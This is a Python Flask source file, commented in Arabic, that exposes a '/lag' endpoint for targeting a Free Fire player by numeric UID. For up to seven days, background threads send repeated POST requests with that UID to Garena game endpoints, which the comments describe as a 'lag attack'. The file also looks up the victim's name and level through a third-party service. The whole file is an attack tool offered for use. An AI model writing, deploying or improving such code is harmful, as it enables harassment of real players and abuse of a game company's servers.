# api/lag.py
from flask import Flask, request, jsonify
import requests
import json
import os
from datetime import datetime, timedelta
import threading
import time

app = Flask(__name__)
DB_FILE = "/tmp/lags.json"  # مسموح في Vercel فقط هنا
active_threads = {}

# تحميل قاعدة البيانات
def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"active": {}}

# حفظ قاعدة البيانات
def save_db(data):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"[ERROR] Save failed: {e}")

# إنشاء الملف إذا ما كانش موجود
if not os.path.exists(DB_FILE):
    save_db({"active": {}})

# هجوم اللاغ
def attack(uid):
    endpoints = [
        "https://ff-advance.garena.com/api/ping",
        "https://ff.garena.com/api/heartbeat"
    ]
    headers = {"User-Agent": "Garena/1.104.1"}
    
    while uid in load_db().get("active", {}):
        payload = {"uid": uid, "ts": int(time.time() * 1000)}
        for url in endpoints:
            try:
                requests.post(url, json=payload, headers=headers, timeout=1)
            except:
                pass
        time.sleep(1)
    
    # حذف عند الانتهاء
    db = load_db()
    db["active"].pop(uid, None)
    save_db(db)
    active_threads.pop(uid, None)

# تنظيف تلقائي
def cleanup_expired():
    while True:
        try:
            db = load_db()
            now = datetime.now()
            to_remove = []
            for uid, data in db.get("active", {}).items():
                end = datetime.fromisoformat(data["end_time"])
                if now >= end:
                    to_remove.append(uid)
            for uid in to_remove:
                db["active"].pop(uid, None)
                active_threads.pop(uid, None)
            save_db(db)
        except Exception as e:
            print(f"[CLEANUP ERROR] {e}")
        time.sleep(3600)  # كل ساعة

threading.Thread(target=cleanup_expired, daemon=True).start()

@app.route('/lag')
def start_lag():
    uid = request.args.get('uid')
    days = request.args.get('days', '7')
    
    if not uid or not uid.isdigit():
        return jsonify({"success": False, "error": "أرسل ?uid=123456789"}), 400

    try:
        days = int(days)
        if days < 1: days = 1
        if days > 7: days = 7
    except:
        days = 7

    db = load_db()
    if uid in db.get("active", {}):
        return jsonify({
            "success": True,
            "uid": uid,
            "message": "اللاغ شغال بالفعل!"
        })

    # تسجيل اللاعب
    end_time = (datetime.now() + timedelta(days=days)).isoformat()
    db["active"][uid] = {"end_time": end_time}
    save_db(db)

    # بدء الهجوم
    thread = threading.Thread(target=attack, args=(uid,), daemon=True)
    thread.start()
    active_threads[uid] = thread

    # جلب اسم اللاعب
    try:
        info = requests.post(
            "https://yasser-api-info-yr.vercel.app/player-info",
            json={"uid": uid},
            timeout=5
        ).json()
        name = info.get("name", "غير معروف")
        level = info.get("level", "غير معروف")
    except:
        name = level = "غير معروف"

    return jsonify({
        "success": True,
        "uid": uid,
        "player": {"name": name, "level": level},
        "duration_days": days,
        "end_date": end_time.split('T')[0],
        "message": f"بدأ اللاغ لمدة {days} أيام!"
    })

# Vercel entrypoint
if __name__ == "__main__":
    app.run()
